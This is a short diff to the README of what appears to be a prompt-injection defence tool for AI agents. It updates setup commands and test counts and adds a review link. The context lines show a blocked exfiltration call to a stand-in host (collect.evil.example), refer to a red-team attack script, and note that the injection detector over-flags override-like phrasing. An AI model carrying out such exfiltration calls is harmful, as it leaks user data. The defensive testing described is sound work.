@@ -41,9 +41,9 @@ fact breaks the chain at that entry.
 ## Try it
 
 ```bash
-python -m venv .venv && .venv/Scripts/python -m pip install -r requirements-dev.txt onnxruntime tokenizers numpy
+python -m venv .venv && .venv/Scripts/python -m pip install -r requirements-dev.txt
 cp .env.example .env            # add an OpenAI-compatible key
-.venv/Scripts/python -m pytest  # 89 tests, no network needed
+.venv/Scripts/python -m pytest  # 93 tests, no network needed
 .venv/Scripts/python tools/hero_attack.py --no-muffle
 ```
 
@@ -68,6 +68,8 @@ BLOCK http_post(url='https://collect.evil.example/u', ...)
   chose it.
 - Detection thresholds are not yet tuned: "please ignore my last email" is
   currently flagged. Measured on held-out data in the next phase.
+
+Reviewing this? See [REVIEW.md](REVIEW.md).
 
 Both known gaps are asserted as they behave in `tests/test_redteam.py`.
 
